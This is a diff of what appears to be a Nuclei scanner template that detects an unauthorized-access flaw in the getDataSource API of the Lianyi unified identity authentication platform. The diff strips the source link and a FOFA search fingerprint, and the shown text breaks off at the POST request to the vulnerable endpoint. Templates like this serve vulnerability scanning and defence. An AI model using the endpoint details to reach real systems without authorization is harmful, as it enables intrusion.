@@ -3,12 +3,8 @@ info:
   name: 联奕统一身份认证平台 getDataSource 未授权访问
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xas8g9frman6mg5x'
+  description: ''
   tags: rce,unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xas8g9frman6mg5x
-    fofa: icon_hash="772658742"
 http:
 - raw:
   - 'POST /api/bd-mdp/serviceManager/outInterface/getDataSource HTTP/1.1
